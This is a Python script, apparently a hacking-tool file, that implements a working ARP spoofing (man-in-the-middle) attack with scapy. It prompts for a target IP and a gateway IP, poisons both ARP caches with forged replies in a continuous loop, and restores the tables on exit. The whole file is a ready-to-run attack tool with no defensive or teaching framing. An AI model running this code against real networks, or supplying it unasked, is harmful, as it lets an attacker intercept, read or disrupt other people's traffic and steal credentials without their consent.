#!/usr/bin/env python

from banner.ghostbanner import *
# from termcolor import colored
import scapy.all as scapy
import time



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if not answered_list:
        print(f"[!] Error: No response for IP {ip}. Ensure the IP is valid and the target is on the network.")
        return None

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        return  # Exit if target MAC address could not be obtained
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    if destination_mac is None:
        return  # Exit if destination MAC address could not be obtained
    source_mac = get_mac(source_ip)
    if source_mac is None:
        return  # Exit if source MAC address could not be obtained
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Ask the user for target and gateway IPs
try:
    target_ip = input("Enter Target IP: ")
    gateway_ip = input("Enter Gateway IP: ")
except KeyboardInterrupt:
    print("\n[!] Script interrupted by user. Exiting gracefully.")
    exit()

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl + C ....... Resetting ARP tables... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables restored. Exiting.")

